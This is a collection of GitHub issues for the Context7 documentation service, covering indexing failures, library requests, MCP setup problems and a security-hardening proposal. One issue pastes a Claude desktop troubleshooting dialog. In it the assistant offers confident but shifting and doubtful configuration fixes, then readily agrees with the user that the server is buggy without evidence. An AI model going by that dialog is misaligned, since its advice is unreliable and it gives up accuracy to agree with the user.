    -H ""CONTEXT7_API_KEY: YOUR_API_KEY"" \
    -d '{""jsonrpc"": ""2.0"", ""id"": 1, ""method"": ""initialize"", ""params"": {}}'
    ```

2.  **Observe the output:** The server returns an `HTTP 406 Not Acceptable` error.

### Suggested Solution

The official documentation and all client configuration examples should be updated to include this mandatory header.

**Example of incorrect configuration (based on current docs):**

```javascript
const headers = {
  ""CONTEXT7_API_KEY"": ""YOUR_API_KEY""
};
```

**Example of correct configuration (the fix):**

```javascript
const headers = {
  ""CONTEXT7_API_KEY"": ""YOUR_API_KEY"",
  ""Accept"": ""application/json, text/event-stream""
};
```

Adding this header resolves the issue immediately. Updating the examples will save other developers time and prevent confusion.

Thanks for the great tool\! Hope this helps."

Currently, Context7 only accepts full GitHub repository URLs, but many repositories contain diverse content where users might only want to index specific subdirectories.

## Use Case
I want to add MDN Web API documentation from:

https://github.com/mdn/content/tree/main/files/en-us/web/api

The full repository contains much more than just Web API docs (HTML guides, CSS docs, etc.), but I only need the browser API capabilities documentation.

## Proposed Solution
Support subdirectory URLs in the format:
- `https://github.com/owner/repo/tree/branch/path/to/subdir`
- Or provide a way to specify which subdirectories to index when adding a repository

## Benefits
- More focused and relevant documentation indexing
- Faster processing by avoiding irrelevant content  
- Better user experience with targeted results

## Current Workaround
Adding the full repository, but this includes a lot of unrelated content."

I am writing to you on behalf of the developer community to request that you consider creating and publishing comprehensive documentation for the Nova Poshta API library. The availability of detailed documentation is critically important for efficient programming, as it significantly speeds up the integration process and helps avoid errors.

The Nova Poshta API (https://developers.novaposhta.ua/) is used by a very large audience of developers. This transport company is rapidly expanding into European markets and is widely used for integrations with many CRM systems, including custom-developed solutions.

Documentation will greatly simplify the work of thousands of programmers who daily build new solutions based on your API. We sincerely believe that its addition will bring tremendous value to the entire ecosystem.

_Sincerely,
The Developer Community_"
upstash/context7,3351611863,594,Discussion: adding the boost libraries,open,2025-08-25T12:14:45Z,2025-08-26T13:56:40Z,[],Jannik2099,"I'd like to add the Boost libraries to Context7.

Boost is a collection of widely used C++ libraries. Boost consists of over 150 libraries, so before I submit each library individually I wanted to consult with the Context7 devs to figure out the optimal approach.

Most documentation is autogenerated via Doxygen or similar tools, so just indexing the individual github repos won't do.

The documentation for the individual libraries can be found at https://www.boost.org/libraries/latest/list/
You can programatically get a list to the documentation root for each library by parsing the above site's html, looking for elements with `title=""Documentation""`, extracting the `href`, and fixing the version path to `latest`.

For example, the html contains
```html
<a class=""text-sky-600 dark:text-sky-300 hover:text-orange dark:hover:text-orange text-base block py-3 pr-2"" href=""[/doc/libs/boost_1_89_0/libs/array/index.html](https://www.boost.org/doc/libs/boost_1_89_0/libs/array/index.html)"" title=""Documentation"">
```
, so the documentation link for Boost.Array would be `https://www.boost.org/doc/libs/latest/libs/array/index.html`

A handful of libraries seem to have already been added https://context7.com/?q=boost , but as said these are basically useless since most documentation is generated, and does not reside in the repositories.

Do you have any suggestions on how to best handle this?"

Which means the mcp server cannot find installed node binary(?)

I have checked if my shell can find the node binary using `which node`. 
The output - `/home/sam/.nvm/versions/node/v24.6.0/bin/node`

I can run npm and npx with no issues. Not sure what I am doing wrong.

### Description
When attempting to add documentation from a website using the ""Add from a Website"" feature, the system returns an ""Error checking website: HTTP 403: Forbidden"" error message.

### Steps to Reproduce
1. Navigate to the Context7 interface
2. Click on ""Add from a Website"" tab
3. Enter a URL (in this case: `https://www.quiltt.dev/` and `https://www.quiltt.dev/api-reference/graphql`)
4. Click ""Add Source"" button

### Expected Behavior
The website should be processed successfully and documentation should be extracted and added to Context7.

### Actual Behavior
The system displays: ""Error checking website: HTTP 403: Forbidden""

### Environment
* Context7 MCP Server
* URLs attempted: `https://www.quiltt.dev/` and `https://www.quiltt.dev/api-reference/graphql`

### Additional Context
This appears to be related to the website's access restrictions. The HTTP 403 status suggests the server is refusing the request, possibly due to:

* User-agent restrictions
* Rate limiting
* Authentication requirements
* Bot detection mechanisms

### Possible Solutions
* Implement user-agent rotation or custom user-agent headers
* Add retry mechanisms with backoff
* Provide better error messaging to help users understand why certain sites can't be accessed
* Add support for authentication headers if needed

My name is Valentin, and I’m part of the Etendo Software team. We’ve been using Context7 to index our wiki:
https://github.com/etendosoftware/docs/

A few weeks ago, the search for Etendo was working perfectly and returned our documentation as expected. However, at some point it stopped working, and now searching for Etendo no longer shows any results.
Example: https://context7.com/?q=Etendo

We can confirm that our documentation is still indexed:
https://context7.com/add-library?tab=github

Steps to reproduce:
	1.	Go to https://context7.com/?q=Etendo
	2.	Notice that no results are displayed.
	3.	Check https://context7.com/add-library?tab=github to confirm our documentation is indexed.

Additional details / Questions:
	•	Are there any indexing criteria that we might not be complying with?
	•	Could there be case-sensitivity, metadata, or stop-word restrictions that prevent “Etendo” from being searchable?
	•	Is there a delay or processing step we should consider after indexing?
	•	Since it worked previously, could there have been a recent change in indexing or search behavior?

When adding the Splide.js documentation website (`https://splidejs.com/documents`) as a source, the crawler fails to process the site correctly. Instead of traversing the different pages and extracting multiple code examples, it generates only a single, large snippet that appears to be a summary of the API.

This results in an unusably low number of snippets and tokens, making the generated context incomplete.

### Steps to Reproduce

1.  Navigate to the project dashboard and choose to add a new source.
2.  Select the ""Add documentation from a Website"" option.
3.  Enter the URL: `https://splidejs.com/documents`
4.  Click ""Add Source"" and wait for the crawling process to complete.
5.  Examine the results.

### Expected Behavior

The crawler should navigate the different sections of the documentation (e.g., Options, API, Events, Examples), identify the numerous code blocks on those pages, and generate a significant number of distinct code snippets. The total token count should be much higher, reflecting the full content of the documentation.

### Actual Behavior

The crawling process completes but yields incorrect results:
*   **Snippets:** 1
*   **Tokens:** 2,214
*   **Q&As:** 10

The single generated snippet is a poorly formatted text block containing a summary of the entire API, rather than actual, usable code examples from the documentation. This suggests the crawler is not correctly rendering the JavaScript-driven navigation or parsing the content of the pages."

I tried troubleshooting it, tried several different configs and no success. It seems to bail after 60 seconds. Here's a dialog that I had with a Claude desktop session. 

```

I've added the context seven MPC server to the cloud desktop config. Yet, when I stopped Claude and restarted it, it doesn't show up, but I do see the MPC slash contact seven Docker container fired up. What might be the problem? 

""context7"": {
      ""command"": ""docker"",
      ""args"": [
        ""run"",
        ""-i"",
        ""--rm"",
        ""mcp/context7""
      ]
    }
Edit
Looking at your configuration, I can see a few potential issues that might explain why the Context7 MPC server isn't showing up after restarting Claude, even though the Docker container is running.

Think of MPC servers like Angular services that need to be properly registered and connected - if the service isn't properly injected or the connection fails, your components won't see it even if the service code is running somewhere in memory.

Here are the most likely problems:

1. Missing stdio transport configuration
Your current config only specifies the Docker command but doesn't tell Claude how to communicate with the server. MPC servers typically need explicit transport configuration:

json
""context7"": {
  ""command"": ""docker"",
  ""args"": [
    ""run"",
    ""-i"",
    ""--rm"",
    ""mcp/context7""
  ],
  ""transport"": {
    ""type"": ""stdio""
  }
}
2. Interactive mode without TTY allocation
The -i flag allocates an interactive session, but without -t (TTY), the container might not be handling input/output correctly for the MPC protocol:

json
""args"": [
  ""run"",
  ""-it"",  // Changed from just ""-i""
  ""--rm"",
  ""mcp/context7""
]
3. Container networking/communication issues
The container might be running but not properly exposing its communication interface. You might need to verify:

The container is actually listening on stdin/stdout
No port mapping is required (since you're using stdio)
The container isn't exiting immediately after startup
Quick debugging steps:
Check container logs: docker logs <container_id> to see if there are any error messages
Test manual connection: Try running the docker command directly in terminal to see if it responds to MPC protocol messages
Verify the image: Ensure mcp/context7 is the correct image name and it's properly built for MPC
The most likely fix is adding the transport configuration - without it, Claude doesn't know how to communicate with the running container, similar to how an Angular service might be running but not properly injected into your component's constructor.

Edit
The logs reveal the exact issue! Think of this like an Angular HTTP interceptor that's timing out - the server is starting correctly, but there's a communication breakdown during the handshake process.

Here's what's happening:

The Problem
Container starts successfully - Context7 is running and listening on HTTP at localhost:8080/mcp
MCP initialization begins - Claude sends the initialize message
Timeout occurs - The container doesn't respond within 60 seconds, causing Claude to cancel the request
Connection drops - The transport closes due to the timeout
The Root Cause
The Context7 container is configured to run as an HTTP server (http://localhost:8080/mcp), but your Claude config is trying to communicate via stdio. It's like trying to make an HTTP call using a WebSocket connection - wrong transport protocol.

The Fix
You need to change your configuration to use HTTP transport instead of stdio:

json
""context7"": {
  ""command"": ""docker"",
  ""args"": [
    ""run"",
    ""-i"",
    ""--rm"",
    ""-p"", ""8080:8080"",
    ""mcp/context7""
  ],
  ""transport"": {
    ""type"": ""http"",
    ""url"": ""http://localhost:8080/mcp""
  }
}
Key changes:

Added port mapping (-p 8080:8080) so the container's port 8080 is accessible on your host
Specified HTTP transport with the correct URL where the server is listening
Removed the stdio assumption since this server clearly runs as an HTTP service
Think of it like the difference between Angular's HttpClient (for HTTP APIs) vs direct component communication - you were trying to use direct communication with a service that only accepts HTTP requests.

Try this configuration and restart Claude. The server should now connect properly since you're using the right transport protocol.




It looks like this server disconnected after one minute.

The same timeout is happening because you're still missing a crucial piece of the configuration!

Looking at the logs, Claude is still trying to communicate with the container via stdio (sending JSON-RPC messages directly to the Docker process), but the Context7 server is running as an HTTP server expecting HTTP requests.

It's like having an Angular service that expects HTTP calls, but your component is trying to call methods on it directly as if it were a regular class instance - the communication protocols don't match.

The Missing Piece
You added the port mapping (-p 8080:8080) but you're missing the transport configuration. Without it, Claude defaults to stdio communication. You need to tell Claude to use HTTP transport:

json
""context7"": {
  ""command"": ""docker"",
  ""args"": [
    ""run"",
    ""-i"",
    ""--rm"",
    ""-p"", ""8080:8080"",
    ""mcp/context7""
  ],
  ""transport"": {
    ""type"": ""http"",
    ""url"": ""http://localhost:8080/mcp""
  }
}
Alternative Approach
If the HTTP transport doesn't work, you might need a different approach. Some MCP servers in Docker containers are designed to communicate via stdio. Try this version that might work better:

json
""context7"": {
  ""command"": ""docker"",
  ""args"": [
    ""run"",
    ""-i"",
    ""--rm"",
    ""mcp/context7"",
    ""--stdio""
  ]
}
The --stdio flag (if supported) would tell the container to use stdin/stdout instead of starting an HTTP server.

Quick Test
Before updating Claude's config, you can test if the HTTP endpoint is working by running:

bash
curl -X POST http://localhost:8080/mcp \
  -H ""Content-Type: application/json"" \
  -d '{""jsonrpc"":""2.0"",""method"":""initialize"",""params"":{""protocolVersion"":""2025-06-18"",""capabilities"":{}},""id"":1}'
If that returns a proper JSON-RPC response, then use the HTTP transport config. If not, try the stdio approach.

It's still failing. Here's the logs. 

Edit
Perfect! Now I can see the actual problem. The error message tells us exactly what's wrong:

docker: Error response from daemon: failed to set up container networking: driver failed programming external connectivity on endpoint priceless_lederberg (494aee244422affc4da2f273723262d999dc1c4c6d30ad14899b65f8b72374ab): Bind for 0.0.0.0:8080 failed: port is already allocated
Port 8080 is already in use! This is like trying to start two Angular dev servers on the same port - the second one will fail because the port is occupied.

The Issue
From your previous attempts, there's likely still a Context7 container running that's already using port 8080. Claude keeps trying to start new containers, but they fail because the port is taken.

Quick Fix
Step 1: Clean up existing containers

bash
# Stop all running Context7 containers
docker ps | grep mcp/context7
docker stop $(docker ps -q --filter ancestor=mcp/context7)

# Or kill all containers using port 8080
docker ps | grep :8080
Step 2: Use a different port Update your config to use an available port:

json
""context7"": {
  ""command"": ""docker"",
  ""args"": [
    ""run"",
    ""-i"",
    ""--rm"",
    ""-p"", ""8081:8080"",
    ""mcp/context7""
  ],
  ""transport"": {
    ""type"": ""http"",
    ""url"": ""http://localhost:8081/mcp""
  }
}
Step 3: Alternative - Remove port mapping entirely If this is meant to be a stdio-based MCP server (not HTTP), try:

json
""context7"": {
  ""command"": ""docker"",
  ""args"": [
    ""run"",
    ""-i"",
    ""--rm"",
    ""mcp/context7""
  ]
}
This removes the port mapping altogether and lets the container communicate via stdio, which might be what it's actually designed for.

The key insight: you had containers piling up from previous failed attempts, each one grabbing port 8080 and preventing new ones from starting.




Here's my config, and I'm still getting errors.

Now I can see the exact issue! The logs show that the Context7 container is only designed to work as an HTTP server, not as a stdio-based MCP server.

Look at this key line from the logs:

Context7 Documentation MCP Server running on HTTP at http://localhost:8080/mcp and legacy SSE at /sse
The Problem
The container starts an HTTP server but doesn't listen to stdin. When Claude sends the initialize message via stdin, the container never responds because it's only designed to handle HTTP requests to /mcp.

Think of it like trying to use Angular's HttpClient to call a method directly on a service instance - the communication protocols don't match.

The Solution
You must use HTTP transport for this container. Here's the correct configuration:

json
""context7"": {
  ""command"": ""docker"",
  ""args"": [
    ""run"",
    ""-i"",
    ""--rm"",
    ""-p"", ""8080:8080"",
    ""mcp/context7""
  ],
  ""transport"": {
    ""type"": ""http"",
    ""url"": ""http://localhost:8080/mcp""
  }
}
Before Restarting Claude
First, make sure port 8080 is free:

bash
# Kill any existing containers using port 8080
docker ps | grep :8080
docker stop $(docker ps -q --filter publish=8080)

# Or check what's using port 8080
lsof -i :8080
The key insight: This container cannot work with stdio transport. It's HTTP-only, so you must configure Claude to use HTTP transport, which requires the port mapping and the transport configuration block.

Without the transport configuration, Claude defaults to stdio communication, which this container will never respond to.




It just dies after one minute with no interaction whatsoever.  I'm beginning to think it's an issue with the way that the MCP context seven server code was written. What do you think?

Edit
You're absolutely right! There's definitely a bug in the Context7 MCP server implementation. Looking at this pattern, it's clear there's a fundamental design flaw.

The Smoking Gun
The logs reveal a classic ""hybrid implementation gone wrong"" scenario:

Claude's MCP framework is correctly configured for HTTP transport and should be making HTTP requests to http://localhost:8080/mcp
But the logs still show Claude sending stdio messages: ""Message from client: {""method"":""initialize""...}
The container starts an HTTP server but somehow still expects or processes stdio input
This is like having an Angular service that's supposed to handle HTTP requests but is also trying to listen for direct method calls - it creates a confused state where neither communication method works properly.

The Real Problem
The Context7 container appears to have a hybrid implementation bug where it:

Announces it's running an HTTP server on port 8080
But still somehow expects/processes stdin input
Fails to properly respond to either HTTP requests OR stdin messages
Dies after exactly 60 seconds (the MCP timeout)
Debugging Steps
1. Test if the HTTP endpoint actually works:

bash
# In another terminal, while the container is running:
curl -X POST http://localhost:8080/mcp \
  -H ""Content-Type: application/json"" \
  -d '{""jsonrpc"":""2.0"",""method"":""initialize"",""params"":{""protocolVersion"":""2025-06-18"",""capabilities"":{}},""id"":1}'
2. Check if it's actually a pure HTTP server:

bash
# Try running it manually and see what it does
docker run -it -p 8080:8080 mcp/context7
# Then try the curl command above
My Diagnosis
This looks like a broken MCP server implementation where the developer tried to support both stdio and HTTP transport but botched the implementation. The server probably:

Starts an HTTP server correctly
But still has stdio handling code that interferes
Doesn't properly implement the MCP HTTP transport protocol
Has a built-in 60-second timeout that kills the process
You might want to either find a different Context7 MCP server implementation or report this as a bug to whoever maintains the mcp/context7 Docker image.

upstash/context7,3306857591,514,Unable to create doc set for Cloudflare Developer Documentation,closed,2025-08-09T21:31:23Z,2025-08-15T21:39:00Z,[],litlmike,"## Issue: Unable to create doc set for Cloudflare Developer Documentation

### Description

When attempting to create a Context7 doc set for Cloudflare's developer documentation at `https://developers.cloudflare.com/`, the process fails with the following error:

```
Error: No (or too few) code snippets found in documentation files.
If you think this is a mistake, please open an issue.
Cloudflare
https://developers.cloudflare.com/docs/
Cloudflare provides a comprehensive suite of services to enh...
```

### Why This Matters

Cloudflare is a critical infrastructure provider used by millions of developers worldwide. Their services include:
- CDN and edge computing (Workers)
- DNS and domain management
- DDoS protection and security services
- Serverless functions and edge storage (KV, R2, D1, Durable Objects)
- Zero Trust security solutions
- AI/ML inference at the edge

Having Context7 support for Cloudflare documentation would benefit thousands of developers who rely on their platform for building modern web applications.

### The Issue

The Cloudflare developer documentation contains extensive code examples across all their products, but Context7's scraper appears unable to detect them. This is likely due to how Cloudflare structures their documentation and code blocks.

### Examples of Documentation with Code Snippets

Here are specific pages that contain numerous code examples that should be detected:

1. **Workers Quick Start**: `https://developers.cloudflare.com/workers/get-started/quickstarts/`
   - Contains JavaScript/TypeScript code examples
   - Shows complete worker implementations
   - Includes wrangler.toml configuration examples

2. **API Documentation**: `https://developers.cloudflare.com/api/operations/zones-get`
   - Contains curl examples
   - JavaScript fetch examples
   - Response JSON examples

3. **Pages Functions**: `https://developers.cloudflare.com/pages/functions/get-started/`
   - TypeScript/JavaScript function examples
   - Configuration code snippets
   - Integration examples

4. **R2 Storage Examples**: `https://developers.cloudflare.com/r2/examples/`
   - Multiple language examples (JavaScript, Python, etc.)
   - Complete implementation examples
   - AWS SDK compatibility code

### Potential Causes

1. **Code Block Formatting**: Cloudflare may use a custom component or formatting for code blocks that the scraper doesn't recognize
2. **Dynamic Loading**: Some code examples might be loaded dynamically via JavaScript
3. **Interactive Examples**: Cloudflare uses interactive code playgrounds in some sections
4. **Documentation Structure**: The site structure might differ from typical documentation sites Context7 expects

### Suggested Solutions

1. Add specific parsing rules for Cloudflare's documentation structure
2. Support for their code block components (they appear to use a custom syntax highlighter)
3. Consider allowing API documentation patterns that Cloudflare uses
4. Add support for detecting code in tabbed interfaces (Cloudflare shows examples in multiple languages using tabs)

### Additional Information

- Cloudflare maintains their docs as open source: https://github.com/cloudflare/cloudflare-docs
- This could potentially be used as an alternative source if the website scraping proves difficult
- The repository contains markdown files with standard code blocks that should be easily parseable

### Expected Behavior

Context7 should successfully create a doc set for Cloudflare documentation, recognizing the hundreds of code examples across their Workers, Pages, R2, KV, D1, and API documentation.

### Environment

- Documentation URL attempted: `https://developers.cloudflare.com/`
- Date of attempt: [August 09, 2025]

### Reproduction Steps

1. Attempt to create a new Context7 doc set
2. Enter `https://developers.cloudflare.com/` as the documentation URL
3. Observe the ""No (or too few) code snippets found"" error

### Impact

This issue prevents developers from using Context7 with one of the most important cloud infrastructure platforms, significantly limiting its utility for modern web development workflows.

Thank you for considering this issue. Cloudflare's documentation is essential for many developers, and Context7 support would be incredibly valuable."

I'm reaching out from the VS Code team to explore the possibility of making the Context7 MCP Server available as a VS Code extension.

Context7 serves as a useful developer tool for providing AI models with access to current documentation. Currently, users need to manually configure it as an MCP server in their editor to use it.

VS Code's Extensions Marketplace offers a robust ecosystem with built-in support for versioning, automatic updates, and centralized governance. To better serve the developer community, we recently introduced the MCP Server Provider API, which enables extensions to register as MCP servers [documentation here](https://code.visualstudio.com/api/extension-guides/ai/mcp#register-an-mcp-server-in-your-extension).

Publishing Context7 as a VS Code extension would provide several benefits:
- Enhanced discoverability through the Extensions Marketplace
- Simplified installation for end users
- Automatic updates and version management
- Broader adoption within the VS Code developer ecosystem

Converting your existing MCP server into a VS Code extension is straightforward and requires minimal changes:

1.  Add MCP Server contribution and context7 npm package dependency  in `package.json`

```json
""contributes"": {
    ""mcpServerDefinitionProviders"": [
      {
        ""id"": ""context7"",
        ""label"": ""Context7""
      }
    ]
  },
""dependencies"": {
    ""@upstash/context7-mcp"": ""1.0.14""
  }
```

2. Register the MCP Server provider during extension activation

```ts
import path from 'path';
import * as vscode from 'vscode';

export function activate(context: vscode.ExtensionContext) {
    context.subscriptions.push(vscode.lm.registerMcpServerDefinitionProvider('context7', {
        provideMcpServerDefinitions(): vscode.McpServerDefinition[] {
            return [
                new vscode.McpStdioServerDefinition(
                    'context7',
                    'node',
                    [
                        path.join(__dirname, '..', 'node_modules', '@upstash', 'context7-mcp', 'dist', 'index.js'),
                    ]
                )
            ];
        }
    }));
}

// This method is called when your extension is deactivated
export function deactivate() { }

```

We believe this would be a valuable addition to the VS Code ecosystem and would be happy to provide guidance throughout the development and publishing process. If you're interested in pursuing this opportunity, please let us know, and we can discuss any technical questions or requirements.

Thank you for considering this request, and we look forward to your thoughts."

I'm currently building an AI automation workflow that integrates n8n, Claude AI (Developer Mode), and Context7 documentation for dynamic decision-making and code generation.
To fully realize this pipeline, I would love to gain early access to the Context7 API.

My project aims to:

Automate LLM workflows using Context7 as a real-time code documentation source.

Incorporate Claude AI in developer mode to dynamically process and act on Context7 API data.

Trigger and orchestrate everything via n8n using webhooks and logic flows.

I've already signed up for the API waitlist and starred the repo 🙌
If there's any way to get early access (or be considered for testing), it would be a great help to my system.

Thanks for your amazing work!

Best regards,  
J.I. Choi

  I would like to request the addition of the Samsung Smart TV developer documentation to the Context7 library. This documentation is a critical resource for developers creating applications for Samsung's Tizen-based smart TVs.

  The official documentation is hosted on the Samsung Developer Portal. However, I've encountered a ""**Failed to determine project name**"" error when trying to add it through the web interface. I've tried several URLs, including
  the main portal URL (https://developer.samsung.com) and more specific overview pages (hhttps://developer.samsung.com/smarttv/develop), but the automated parser seems unable to identify the project name, likely due to the broad and complex structure of the site.

  Here is the key information for the requested library:

   * Library Name: Samsung Smart TV (or Tizen for TV)
   * Primary URL: https://developer.samsung.com/smarttv/develop/
   * API References URL: https://developer.samsung.com/smarttv/develop/api-references/web-api-references.html
   * Description: This documentation provides essential guides, API references, and tutorials for developing web-based applications for Samsung Smart TVs. It covers TV-specific Web APIs, the Tizen application framework, and
     other features necessary for building rich media and interactive experiences on the Samsung TV platform.

  Adding these documents would be immensely valuable for the developer community working on smart TV applications.

  Could you please assist in getting this documentation indexed in the Context7 library?

  Thank you for your time and consideration."

I'm experiencing an issue where Context7 is not detecting any tags for the `django/django` repository, despite the repository having numerous version tags available.

Reproduce:
1. Navigate to [Context7's django/django add library page](https://context7.com/add-library-tag?libraryName=%2Fdjango%2Fdjango): 
2. Observe that no version tags are shown in the dropdown/selection

Expected Behaviour:
The system should detect and display the available version tags from the Django repository, such as:

Actual Behavior:
No tags are detected or displayed, preventing me from selecting a specific Django version.

Now, I'm trying to add the official TTML specs from https://www.w3.org/TR/ttml2, but for this one I'm getting this error:
`Failed to determine project name`.

Would appreciate some help parsing and uploading these specs to Context7.

The specs for both WebVTT (which is already parsed from the website) and TTML also have GitHub repos, but the Context7 parser doesn't seem to be able to parse whatever format they're using to create the docs website:
https://github.com/w3c/ttml2
https://github.com/w3c/webvtt

In case you're wondering why I want to add these, they're really helpful for when writing a parsers for these file formats using agentic coders.

I'll also add that I use Context7 regularly, and it saved me a ton of time, so thank you, it's truly amazing!"

**Origin**  
This issue is being filed directly from **Cursor** (AI-powered coding editor).

---

#### ⚙️ Environment
| Item | Value |
| ---- | ----- |
| Tooling | MCP Tools with Context7 integration (latest build) |
| Editor | Cursor |
| OS | Windows 10 (10.0.19045) |
| Workspace Path | `D:\Workspace\Ya_Cloud\career-service` |
| Date / Time of Last Attempt | <!-- fill in current date/time --> |

---

#### 🔁 Steps to Reproduce
1. Resolve Telegram-related libraries:  
   ```text
   /context7/telegram-docs  
   /context7/core_telegram-bots  
   /python-telegram-bot/python-telegram-bot  
   /go-telegram-bot-api/telegram-bot-api  
   /telegrambots/book  
   ```
2. Call `get-library-docs` (with and without `topic`), e.g.  
   ```text
   get-library-docs: /context7/telegram-docs
   ```
3. Observe returned message.

---

#### 🧨 Actual Result
Documentation not found or not finalized for this library.
This might have happened because you used an invalid Context7-compatible library ID.


The same response occurs for every listed ID.

---

#### 🎯 Expected Result
The desired Telegram Bot API documentation (or a clear indication of its correct Context7 library ID / version).

---

#### 📋 Impact
* Impossible to cite Telegram API docs from Context7 inside Cursor.
* Blocks generation of answers that rely on official references.

---

#### ❓ Questions
1. Is Telegram Bot API documentation currently published and accessible through Context7?  
2. If yes, what is/are the correct Context7-compatible library ID(s) or version path(s)?  
3. If no, is there an ETA for publication or any alternative access method?

Add a new MCP tool that allows Claude and other AI assistants to programmatically request indexing of new repositories, reducing manual steps and enabling more dynamic documentation access.

## Problem Statement
Currently, users must manually add repositories through the Context7 web interface at https://context7.com. There's no programmatic way for Claude or other AI assistants to request the indexing of new repositories through the Model Context Protocol (MCP).

This creates friction when:
- AI assistants encounter repositories during conversations that aren't yet indexed (Claude then reverts to web searches, which are not nearly as good)

## Proposed Solution
Add a new MCP tool (e.g., `request-repo-indexing`) that would allow Claude to:

1. **Request indexing of a specific repository** by providing:
   - Repository URL
   - Optional indexing preferences (branch, specific paths, etc.)

2. **Check indexing status** of pending requests (request the same repo again with the same tool, server rejects with status, either: ""already exists"" or ""index in process, ETA:"" or ""does not exist"")

Case study - https://github.com/cytomining/copairs/ (very new, minimal docs)

Context7 showed 29 snippets, all using this pattern:
  ```python
  from copairs import map
  map.mean_average_precision()
  ```
Based on this, I incorrectly concluded that direct imports were invalid:
  ```python
  from copairs.map import mean_average_precision  # Marked as ""wrong""
  ```
However, checking the source code revealed these direct imports ARE valid - they're exported in `__init__.py`

While context7 provides a ""Trust Score"" (copairs had 6.0 vs scikit-learn's 8.5), it's not clear what this score indicates about documentation completeness.

Context7's documentation doesn't make it clear that:

1. Examples show recommended patterns, not ALL valid patterns
2. Tutorial-style docs may not reflect the complete API surface
3. Smaller libraries may only have usage examples, not API references
4. Lower trust scores might indicate incomplete API coverage

Should the context7 documentation include a warning like:

> ""Code examples demonstrate common usage patterns and may not show all valid import methods or API variations. For definitive API compatibility, always verify against the library's source code.""

or something like that?

I was trying to get context7 to index one of my project's documentation (https://lumenblocks.dev/docs or https://github.com/Leaf-Computer/lumen-blocks) so I can start using context7 with it.

I tried using the git repository indexer, but I ran into an issue. My documentation makes references to specific code examples on a separate file, but the indexer does not resolve it. Example:

```markdown
TITLE: Implement Basic UI Switch
DESCRIPTION: Demonstrates a simple UI switch component for toggling between two states, providing fundamental functionality.
SOURCE: https://github.com/leaf-computer/lumen-blocks/blob/main/docsite/docs/docs-src/0.1/src/switch/index.md#_snippet_0

LANGUAGE: inject-dioxus
CODE:
'''
DemoFrame {
    switch_examples::basic::BasicSwitchExample {}
}
'''

LANGUAGE: rust
CODE:
'''
{{#include src/doc_examples/switch_examples.rs:basic}}
'''
```

I also tried indexing by providing the website link, but I believe it detected it as a non-documentation website.

Can you please provide some guidance on how I could index this project?

Thank you in advance!"

The main crate page [softbuffer](https://docs.rs/softbuffer/latest/softbuffer/) is processed, but critical API pages like [`Surface` struct](https://docs.rs/softbuffer/latest/softbuffer/struct.Surface.html) remain undetected.

This replicates #329's original issue where linked documentation hierarchies require recursive traversal. For rust crates, trait/struct pages typically reside under `/softbuffer/[item]` paths - current crawling depth appears limited to top-level.

**Reproduce**:
1. Add library using docs.rs URL
2. Check indexed content for missing struct pages

**Evidence**:
Uncrawled struct: https://docs.rs/softbuffer/latest/softbuffer/struct.Surface.html

upstash/context7,3150100596,297,Feature Request: Include MCP Server in GitHub Copilot coding Agent,closed,2025-06-16T13:47:50Z,2025-06-17T11:06:08Z,[],philipp-kremer,"**Description:**
Enable the integration of context7 as a Modular Control Protocol (MCP) server within the GitHub Copilot Coding Agent. This feature would allow Copilot to leverage context7’s up-to-date code documentation and context management capabilities to enhance AI-assisted development workflows, especially for LLMs and advanced code editors.

**Requirements**
MCP Server Compatibility

context7 must expose an MCP server interface that adheres to the MCP protocol specifications.
The server should handle standard MCP requests, including but not limited to context retrieval, code documentation updates, and state synchronization.
Copilot Agent Integration

The Copilot Coding Agent should be able to discover and communicate with context7’s MCP server.
All relevant Copilot workflows (e.g., code suggestions, inline documentation, refactoring hints) should be able to consume data from the MCP server.
Security & Authentication

Implement secure authentication between Copilot and the MCP server (e.g., via API keys or OAuth tokens).
Ensure only authorized Copilot agents or users can access sensitive context or documentation data.
Configurability

Allow repository maintainers to enable/disable MCP server integration via repository settings or configuration files.
Support custom endpoints and advanced configuration options for context7 MCP server instances.
Documentation & Usage Instructions

Provide clear documentation for setup, usage, and troubleshooting the MCP server integration for both Copilot users and repository maintainers.

**Acceptance Criteria**

- [ ] context7 exposes an MCP server endpoint that passes standard MCP protocol compliance tests.
- [ ]  Copilot Coding Agent successfully connects to context7’s MCP server and retrieves context/documentation data during code suggestion workflows.
- [ ]  Comprehensive documentation is available covering setup, supported features, configuration, and troubleshooting steps.
- [ ] In Tools add the possibility to only add libaries you want to use"

Add first-class security hardening to Context7 by providing:

1. A `SECURITY.md` with clear disclosure guidelines
2. Out-of-the-box TLS 1.3 enforcement
3. Continuous dependency-scanning (npm audit, Snyk, Dependabot)
4. Container-image scanning (Trivy)
5. Optional RBAC middleware and structured logging

## 🛠 Background

Context7 powers LLM-based tooling, often in developer and corporate environments. At present:

* No published security policy or responsible-disclosure process
* HTTP/SSE endpoints default to unencrypted transport unless manually configured
* No built-in supply-chain or container image scanning workflows
* No role-based access control or centralized logging support

This leaves adopters to roll their own security measures, slowing integration and risking misconfiguration.

## 🎯 Goals

* **Governance:** Provide a standard `SECURITY.md` so users know how to report issues and which versions are supported.
* **Transport Security:** Enforce TLS 1.3 by default in both Docker and local runs.
* **Supply-Chain Protection:** Integrate automated dependency-scanning in GitHub Actions (npm audit, Snyk or Dependabot) and container scanning via Trivy.
* **Access Control & Auditing:** Offer optional RBAC middleware (JWT or API-key based) and structured request logging for SIEM ingestion.

## 💡 Proposed Implementation

1. **Add `SECURITY.md`**

   * Document reporting channels (`security@upstash.com`), supported versions, and response SLA.
2. **TLS 1.3 Enforcement**

   * Update startup script to detect certs in `/certs` and launch HTTPS server with `minVersion: 'TLSv1.3'`.
   * Provide Dockerfile adjustments and sample `docker-compose.yml`.
3. **GitHub Actions Workflows**

   * Create `.github/workflows/security.yml` that runs:

     * `npm audit --audit-level=high`
     * `snyk test` (if Snyk token present)
     * Dependabot config in `.github/dependabot.yml`
   * Add `.github/workflows/container-scan.yml` using `aquasecurity/trivy-action`.
4. **RBAC & Logging**

   * New optional middleware package in `@modelcontextprotocol/security` that reads `ADMIN_ROLES` from env, enforces on protected endpoints.
   * Hook into existing request pipeline to emit JSON logs (timestamp, route, principal) to stdout for collectors.

## 🚀 Benefits

* Faster, safer adoption in corporate environments
* Standardized process for vulnerability reporting and handling
* Reduced risk of supply-chain & MITM attacks out of the box
* Clear audit trail for compliance with security policies

*Would love feedback on scope, naming, and any additional best practices!*

